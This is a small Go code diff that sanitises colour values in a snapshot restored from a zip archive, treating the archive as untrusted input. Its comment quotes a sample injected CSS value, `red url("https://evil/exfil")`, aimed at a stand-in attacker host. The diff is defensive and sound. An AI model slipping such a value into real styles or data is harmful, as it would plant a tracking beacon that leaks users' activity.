@@ -531,6 +531,13 @@ func readSnapshotFromZip(zr *zip.Reader) (*Snapshot, error) {
 	if err := json.NewDecoder(f).Decode(&snap); err != nil {
 		return nil, fmt.Errorf("parse database.json: %w", err)
 	}
+	// The zip is a trust boundary: tag/folder colors come from attacker-
+	// controlled input and a `red url("https://evil/exfil")` value would
+	// render as a tracking pixel on every chip (CLAUDE.md §4). Coerce BEFORE
+	// any restore mode touches the snapshot, so identity/skip/duplicate all
+	// inherit the guard. Silently coerces today; a future iteration can
+	// surface the returned count as a restore warning.
+	snap.Sanitize()
 	return &snap, nil
 }
 
